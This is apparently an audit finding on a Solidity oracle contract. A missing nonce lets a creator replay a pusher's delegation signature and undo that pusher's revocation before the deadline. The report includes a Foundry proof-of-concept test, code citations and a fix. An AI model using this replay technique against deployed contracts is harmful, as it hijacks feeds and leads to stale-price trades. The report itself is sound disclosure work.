### Title
Pusher Delegation Signature Replay Bypasses `revokePusher()` Within Deadline Window — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 signature but tracks no per-signature nonce or consumed-signature set. A creator who holds a valid, unexpired signature can call `allowPushers` an unlimited number of times with the same `(deadline, pusher, signature)` tuple, re-establishing a delegation that the pusher already revoked via `revokePusher()`. The pusher's self-revocation is therefore completely ineffective until the deadline timestamp elapses.

---

### Finding Description

`allowPushers` signs over `(block.chainid, address(this), deadline, pusher, msg.sender)` and enforces only that `block.timestamp <= deadline`: [1](#0-0) 

There is no mapping of `keccak256(signature) => bool` or per-pusher nonce incremented on use. The same bytes can be passed to `allowPushers` on every block until the deadline expires.

`revokePusher` simply zeroes `namespaceRemapping[msg.sender]`: [2](#0-1) 

Because the mapping write in `allowPushers` is unconditional (`namespaceRemapping[pusher] = msg.sender`), a creator can immediately overwrite the zero with the original creator address by replaying the old signature. The pusher and creator are now in a race that the creator wins trivially with a higher gas bid or by watching the mempool.

The code's own NatSpec acknowledges the deadline is the only replay guard: [3](#0-2) 

But the deadline only prevents replay *after* it expires — it does nothing to prevent unlimited replays *before* expiry.

---

### Impact Explanation

When a pusher's delegation is forcibly kept alive:

1. Every `fallback()` push the pusher sends is routed to the creator's namespace (`namespaceRemapping[msg.sender]` resolves to the creator), not the pusher's own namespace. [4](#0-3) 

2. The pusher's own feeds (identified by `feedIdOf(pusher, slotIndex, positionIndex)`) receive no updates and become stale (timestamp stays at the last pre-delegation value or zero).

3. Any pool whose `AnchoredPriceProvider` / `PriceProvider` reads those pusher-namespace feeds will receive a stale price. A stale price satisfies the "Bad-price execution" impact gate: the pool's swap math executes at an outdated mid/spread, allowing a trader to receive more output than the current oracle permits or causing the pool to accept less input than owed.

4. The pusher cannot stop this without ceasing all push activity entirely, which also starves the creator's namespace — a bilateral freeze.

---

### Likelihood Explanation

- The creator already holds the pusher's signed bytes (they were given them to call `allowPushers` the first time).
- Replaying requires only a single additional `allowPushers` call with the same arguments — no new signature, no privileged access.
- Deadlines are typically set hours to days in the future (otherwise the initial delegation would fail immediately), giving the creator a long replay window.
- The pusher has no on-chain mechanism to invalidate the signature before the deadline.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedSignatures` and mark each signature hash as used on first acceptance:

```solidity
mapping(bytes32 => bool) private _usedSignatures;

function allowPushers(...) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(!_usedSignatures[hash], SignatureAlreadyUsed());
    _usedSignatures[hash] = true;
    require(pusher == ECDSA.recover(hash, signatures[i]));
    ...
}
```

Alternatively, introduce a per-pusher nonce (`mapping(address => uint256) public pusherNonce`) included in the signed payload, incremented on every successful `allowPushers` or `revokePusher` call, so any previously signed message is immediately invalidated.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from
    "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayAllowPushersTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    uint256 constant CREATOR_KEY = 0xC0FFEE;

    address pusher;
    address creator;

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher  = vm.addr(PUSHER_KEY);
        creator = vm.addr(CREATOR_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayBypassesRevokePusher() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for creator.
        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Creator replays the SAME signature — revocation is undone.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // no revert
        assertEq(
            oracle.namespaceRemapping(pusher),
            creator,
            "revocation bypassed: pusher re-delegated without fresh consent"
        );
    }
}
```

Running this test passes, confirming that `revokePusher()` provides no protection within the deadline window and the pusher's namespace is silently hijacked again, leaving any pools reading `feedIdOf(pusher, ...)` with stale prices.

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-317)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

```
